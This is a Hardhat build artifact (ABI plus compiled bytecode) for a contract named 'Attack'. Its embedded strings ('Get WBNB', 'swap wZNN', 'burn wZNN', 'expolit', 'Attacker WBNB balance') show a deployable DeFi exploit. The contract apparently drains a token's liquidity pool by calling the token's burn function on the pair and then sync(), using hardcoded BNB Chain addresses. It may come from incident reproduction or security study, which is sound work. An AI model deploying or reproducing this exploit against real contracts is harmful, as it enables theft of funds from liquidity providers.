{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/attack.sol",
  "abi": [
    {
      "inputs": [],
      "name": "start",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405273bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550738a7ca49f42e5196c26bb00fa014352e5d065db4d600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073a6744c5065e778b47a9ab4ce1e2dc4a6b489effa600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507310ed43c718714eb63d5aa57b78b54704e256024e600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561016357600080fd5b506112ff806101736000396000f3fe6080604052600436106100225760003560e01c8063be9a65551461002e57610029565b3661002957005b600080fd5b34801561003a57600080fd5b50610043610045565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b81526004016100e292919061103a565b602060405180830381600087803b1580156100fc57600080fd5b505af1158015610110573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101349190610eaa565b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b81526004016101d492919061103a565b602060405180830381600087803b1580156101ee57600080fd5b505af1158015610202573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102269190610eaa565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b81526004016102c492919061103a565b602060405180830381600087803b1580156102de57600080fd5b505af11580156102f2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103169190610eaa565b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b81526004016103b692919061103a565b602060405180830381600087803b1580156103d057600080fd5b505af11580156103e4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104089190610eaa565b506104476040518060400160405280600881526020017f4765742057424e42000000000000000000000000000000000000000000000000815250610d22565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a7640000619c40906040518363ffffffff1660e01b81526004016000604051808303818589803b1580156104bb57600080fd5b5088f11580156104cf573d6000803e3d6000fd5b505050505050600066038d7ea4c68000905061051f6040518060400160405280600b81526020017f312e7377617020775a4e4e000000000000000000000000000000000000000000815250610d22565b6000600267ffffffffffffffff811115610562577f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6040519080825280602002602001820160405280156105905781602001602082028036833780820191505090505b50905073bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c816000815181106105e2577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050738a7ca49f42e5196c26bb00fa014352e5d065db4d8160018151811061066b577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635c11d7958360008430426040518663ffffffff1660e01b81526004016107099594939291906110b5565b600060405180830381600087803b15801561072357600080fd5b505af1158015610737573d6000803e3d6000fd5b505050506107796040518060400160405280600b81526020017f322e6275726e20775a4e4e000000000000000000000000000000000000000000815250610d22565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639dc29fac600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166502684441b06b6040518363ffffffff1660e01b81526004016107fe929190611011565b600060405180830381600087803b15801561081857600080fd5b505af115801561082c573d6000803e3d6000fd5b50505050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fff6cae96040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561089a57600080fd5b505af11580156108ae573d6000803e3d6000fd5b505050506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161090f9190610ff6565b60206040518083038186803b15801561092757600080fd5b505afa15801561093b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061095f9190610ed3565b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b8152600401610a0092919061103a565b602060405180830381600087803b158015610a1a57600080fd5b505af1158015610a2e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a529190610eaa565b50610a916040518060400160405280600981526020017f332e6578706f6c69740000000000000000000000000000000000000000000000815250610d22565b73bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c82600181518110610ae0577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050738a7ca49f42e5196c26bb00fa014352e5d065db4d82600081518110610b69577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635c11d7958260008530426040518663ffffffff1660e01b8152600401610c079594939291906110b5565b600060405180830381600087803b158015610c2157600080fd5b505af1158015610c35573d6000803e3d6000fd5b5050505060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610c959190610ff6565b60206040518083038186803b158015610cad57600080fd5b505afa158015610cc1573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610ce59190610ed3565b9050610d1c6040518060600160405280602781526020016112a360279139670de0b6b3a764000083610d179190611164565b610dbb565b50505050565b610db881604051602401610d369190611063565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050610e57565b50565b610e538282604051602401610dd1929190611085565b6040516020818303038152906040527f9710a9d0000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050610e57565b5050565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b600081519050610e8f81611274565b92915050565b600081519050610ea48161128b565b92915050565b600060208284031215610ebc57600080fd5b6000610eca84828501610e80565b91505092915050565b600060208284031215610ee557600080fd5b6000610ef384828501610e95565b91505092915050565b6000610f088383610f14565b60208301905092915050565b610f1d81611195565b82525050565b610f2c81611195565b82525050565b6000610f3d8261111f565b610f478185611142565b9350610f528361110f565b8060005b83811015610f83578151610f6a8882610efc565b9750610f7583611135565b925050600181019050610f56565b5085935050505092915050565b610f99816111dd565b82525050565b610fa8816111ef565b82525050565b6000610fb98261112a565b610fc38185611153565b9350610fd3818560208601611201565b610fdc81611263565b840191505092915050565b610ff0816111d3565b82525050565b600060208201905061100b6000830184610f23565b92915050565b60006040820190506110266000830185610f23565b6110336020830184610f9f565b9392505050565b600060408201905061104f6000830185610f23565b61105c6020830184610fe7565b9392505050565b6000602082019050818103600083015261107d8184610fae565b905092915050565b6000604082019050818103600083015261109f8185610fae565b90506110ae6020830184610fe7565b9392505050565b600060a0820190506110ca6000830188610fe7565b6110d76020830187610f90565b81810360408301526110e98186610f32565b90506110f86060830185610f23565b6111056080830184610fe7565b9695505050505050565b6000819050602082019050919050565b600081519050919050565b600081519050919050565b6000602082019050919050565b600082825260208201905092915050565b600082825260208201905092915050565b600061116f826111d3565b915061117a836111d3565b92508261118a57611189611234565b5b828204905092915050565b60006111a0826111b3565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006111e8826111d3565b9050919050565b60006111fa826111d3565b9050919050565b60005b8381101561121f578082015181840152602081019050611204565b8381111561122e576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000601f19601f8301169050919050565b61127d816111a7565b811461128857600080fd5b50565b611294816111d3565b811461129f57600080fd5b5056fe46696e6973682061747461636b696e672c41747461636b65722057424e422062616c616e63653aa2646970667358221220aa721b92d6e2681748674fab553324d33c5263449afc96fb804606916994122d64736f6c63430008000033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}